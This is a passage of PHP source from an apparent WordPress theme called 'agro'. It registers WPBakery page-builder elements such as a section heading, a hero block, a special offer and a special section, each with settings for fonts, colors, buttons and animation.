                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('6 column', 'agro') => 'col-xl-6',
                            esc_html__('7 column', 'agro') => 'col-xl-7',
                            esc_html__('8 column', 'agro') => 'col-xl-8',
                            esc_html__('9 column', 'agro') => 'col-xl-9',
                            esc_html__('10 column', 'agro') => 'col-xl-10',
                            esc_html__('11 column', 'agro') => 'col-xl-11',
                            esc_html__('12 column', 'agro') => 'col-xl-12'
                        )
                    ),
                    // fonts
                    array(
                        'type' => 'nt_spacer',
                        'param_name' => 'fonts_spacer',
                        'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                        'group' => esc_html__('Fonts', 'agro')
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'usefonts',
                        'heading' => esc_html__('Use Google Fonts?', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Heading tag', 'agro'),
                        'param_name' => 'htag',
                        'group' => esc_html__('Fonts', 'agro'),
                        'value' => array(
                            esc_html__('Select tag', 'agro') => '',
                            esc_html__('h1', 'agro') => 'h1',
                            esc_html__('h2', 'agro') => 'h2',
                            esc_html__('h3', 'agro') => 'h3',
                            esc_html__('h4', 'agro') => 'h4',
                            esc_html__('h5', 'agro') => 'h5',
                            esc_html__('h6', 'agro') => 'h6',
                            esc_html__('div', 'agro') => 'div',
                            esc_html__('p', 'agro') => 'p',
                            esc_html__('span', 'agro') => 'span'
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'tsize',
                        'heading' => esc_html__('Font size', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'lheight',
                        'heading' => esc_html__('Line height', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'google_fonts',
                        'param_name' => 'google_fonts',
                        'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                        'group' => esc_html__('Fonts', 'agro'),
                        'settings' => array(
                            'fields' => array(
                                'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                                'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                            )
                        ),
                        'dependency' => array(
                            'element' => 'usefonts',
                            'not_empty' => true
                        )
                    ),
                    // color
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'tclr',
                        'heading' => esc_html__('Title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'dclr',
                        'heading' => esc_html__('Description color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'nt_spacer',
                        'param_name' => 'btn_spacer',
                        'heading' => esc_html__('Button Customize', 'agro'),
                        'group' => esc_html__('Color', 'agro')
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Button type', 'agro'),
                        'param_name' => 'btntype',
                        'edit_field_class' => 'vc_col-sm-4',
                        'group' => esc_html__('Color', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Round', 'agro') => 'btn-round',
                            esc_html__('Square', 'agro') => 'btn-square',
                            esc_html__('Rounded', 'agro') => 'btn-rounded'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Button style', 'agro'),
                        'param_name' => 'btnstyle',
                        'edit_field_class' => 'vc_col-sm-4',
                        'group' => esc_html__('Color', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-3',
                            esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Button size', 'agro'),
                        'param_name' => 'btnsize',
                        'edit_field_class' => 'vc_col-sm-4',
                        'group' => esc_html__('Color', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Big', 'agro') => 'custom-btn--big',
                            esc_html__('Medium', 'agro') => 'custom-btn--medium',
                            esc_html__('Small', 'agro') => 'custom-btn--small'
                        )
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr2',
                        'group' => esc_html__('Color', 'agro'),
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnbg',
                        'heading' => esc_html__('Button background', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnhvrbg',
                        'heading' => esc_html__('Hover button background', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr3',
                        'group' => esc_html__('Color', 'agro'),
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnclr',
                        'heading' => esc_html__('Button title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnhvrclr',
                        'heading' => esc_html__('Hover button title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr4',
                        'group' => esc_html__('Color', 'agro'),
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnbrd',
                        'heading' => esc_html__('Button border color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnhvrbrd',
                        'heading' => esc_html__('Hover button border color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                )
            )
        );
    }
    if (class_exists('WPBakeryShortCode')) {
        class WPBakeryShortCode_Agro_Slick_Slider_Item1 extends WPBakeryShortCode
        {
        }
    }
}

/*******************************/
/* section heading
/******************************/
if (!function_exists('agro_section_heading_integrateWithVC')) {
    add_action('vc_before_init', 'agro_section_heading_integrateWithVC');
    function agro_section_heading_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Section Heading', 'agro'),
        'base' => 'agro_section_heading',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section title', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section thin title', 'agro')
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section description', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'anim',
                'heading' => esc_html__('Add animation?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'dropdown',
                'param_name' => 'aos',
                'heading' => esc_html__('Animation', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'value' => bon_anim_aos(),
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'delay',
                'heading' => esc_html__('Animation delay', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'offset',
                'heading' => esc_html__('Animation offset', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // colors
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}
/*******************************/
/* home 3 hero
/******************************/
if (!function_exists('agro_home3herointegrateWithVC')) {
    add_action('vc_before_init', 'agro_home3hero_integrateWithVC');
    function agro_home3hero_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Home 3 Hero', 'agro'),
        'base' => 'agro_home3hero',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section title', 'agro')
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'bgimg',
                'heading' => esc_html__('Background Image', 'agro')
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Text Content Column Width', 'agro'),
                'param_name' => 'md',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('6 column', 'agro') => 'col-md-6',
                    esc_html__('7 column', 'agro') => 'col-md-7',
                    esc_html__('8 column', 'agro') => 'col-md-8',
                    esc_html__('9 column', 'agro') => 'col-md-9',
                    esc_html__('10 column', 'agro') => 'col-md-10',
                    esc_html__('11 column', 'agro') => 'col-md-11',
                    esc_html__('12 column', 'agro') => 'col-md-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Text Alignment', 'agro'),
                'param_name' => 'alignment',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('left', 'agro') => 'text-left',
                    esc_html__('center', 'agro') => 'text-center',
                    esc_html__('right', 'agro') => 'text-right',
                )
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* special_offer
/******************************/
if (!function_exists('agro_special_offer_integrateWithVC')) {
    add_action('vc_before_init', 'agro_special_offer_integrateWithVC');
    function agro_special_offer_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Special Offer', 'agro'),
        'base' => 'agro_special_offer',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'attach_image',
                'param_name' => 'img',
                'heading' => esc_html__('Background image', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Title', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'anim',
                'heading' => esc_html__('Add animation?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'dropdown',
                'param_name' => 'aos',
                'heading' => esc_html__('Animation', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'value' => bon_anim_aos(),
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'delay',
                'heading' => esc_html__('Animation delay', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'offset',
                'heading' => esc_html__('Animation offset', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* special_section
/******************************/
if (!function_exists('agro_special_section_integrateWithVC')) {
    add_action('vc_before_init', 'agro_special_section_integrateWithVC');
    function agro_special_section_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Special Section', 'agro'),
        'base' => 'agro_special_section',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'attach_image',
                'param_name' => 'bgimg',
                'heading' => esc_html__('Background image', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw1',
                'heading' => esc_html__('Background image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh1',
                'heading' => esc_html__('Background image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link',
                'heading' => esc_html__('Button title and link', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'anim',
                'heading' => esc_html__('Add animation?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'dropdown',
                'param_name' => 'aos',
                'heading' => esc_html__('Animation', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'value' => bon_anim_aos(),
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'delay',
                'heading' => esc_html__('Animation delay', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'offset',
                'heading' => esc_html__('Animation offset', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            // section image
            array(
                'type' => 'attach_image',
                'param_name' => 'img',
                'heading' => esc_html__('Center image', 'agro'),
                'group' => esc_html__('Center image', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw2',
                'heading' => esc_html__('Image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Center image', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh2',
                'heading' => esc_html__('Image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Center image', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'anim2',
                'heading' => esc_html__('Add animation?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'group' => esc_html__('Center image', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'param_name' => 'aos2',
                'heading' => esc_html__('Animation', 'agro'),
                'group' => esc_html__('Center image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'value' => bon_anim_aos(),
                'dependency' => array(
                    'element' => 'anim2',
                    'not_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'delay2',
                'heading' => esc_html__('Animation delay', 'agro'),
                'group' => esc_html__('Center image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim2',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'offset2',
                'heading' => esc_html__('Animation offset', 'agro'),
                'group' => esc_html__('Center image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim2',
                    'not_empty' => true
                )
            ),
            // section description
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Title', 'agro'),
                'group' => esc_html__('Description', 'agro'),
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'anim3',
                'heading' => esc_html__('Add animation?', 'agro'),
                'group' => esc_html__('Description', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'dropdown',
                'param_name' => 'aos3',
                'heading' => esc_html__('Animation', 'agro'),
                'group' => esc_html__('Description', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'value' => bon_anim_aos(),
                'dependency' => array(
                    'element' => 'anim3',
                    'not_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'delay3',
                'heading' => esc_html__('Animation delay', 'agro'),
                'group' => esc_html__('Description', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim3',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'offset3',
                'heading' => esc_html__('Animation offset', 'agro'),
                'group' => esc_html__('Description', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim3',
                    'not_empty' => true
                )
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Section Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button type', 'agro'),
                'param_name' => 'btntype',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Round', 'agro') => 'btn-round',
                    esc_html__('Square', 'agro') => 'btn-square',
                    esc_html__('Rounded', 'agro') => 'btn-rounded'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button style', 'agro'),
                'param_name' => 'btnstyle',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-1',
                    esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button size', 'agro'),
                'param_name' => 'btnsize',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Big', 'agro') => 'custom-btn--big',
                    esc_html__('Medium', 'agro') => 'custom-btn--medium',
                    esc_html__('Small', 'agro') => 'custom-btn--small'
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr2',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr3',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
